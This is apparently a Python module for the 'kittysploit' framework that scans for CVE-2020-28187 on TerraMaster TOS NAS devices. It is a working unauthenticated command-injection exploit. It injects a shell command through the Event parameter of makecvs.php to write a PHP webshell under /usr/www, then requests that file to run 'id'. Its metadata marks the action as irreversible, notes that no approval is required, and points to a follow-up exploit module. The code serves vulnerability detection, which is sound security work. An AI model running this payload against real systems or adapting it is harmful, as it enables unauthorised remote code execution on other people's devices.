#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TerraMaster TOS makecvs.php Event RCE (CVE-2020-28187)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TerraMaster TOS - makecvs.php RCE Detection (CVE-2020-28187)',
        'description': (
            'Detects CVE-2020-28187 by injecting via /include/makecvs.php?Event= to write a '
            'PHP webshell under /usr/www/<token>.php and executing id.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'terramaster', 'nas', 'rce',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/linux/http/terramaster_cve_2020_28187_rce',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2020-28187',
        ],
        'cve': 'CVE-2020-28187',
    }

    def run(self):
        name = secrets.token_hex(6) + '.php'
        # Event payload writes a self-deleting PHP shell then we hit it.
        payload = (
            f'http|echo "<?php system(\'id\'); unlink(__FILE__); ?>" > /usr/www/{name}'
            f' && chmod +x /usr/www/{name}||'
        )
        from urllib.parse import quote
        path = '/include/makecvs.php?Event=' + quote(payload, safe='')
        self.http_request(method='GET', path=path, allow_redirects=False)
        r = self.http_request(method='GET', path=f'/{name}', allow_redirects=False)
        if r and re.search(r'uid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='TerraMaster makecvs.php RCE (CVE-2020-28187)',
                path='/include/makecvs.php',
            )
            return True
        return False
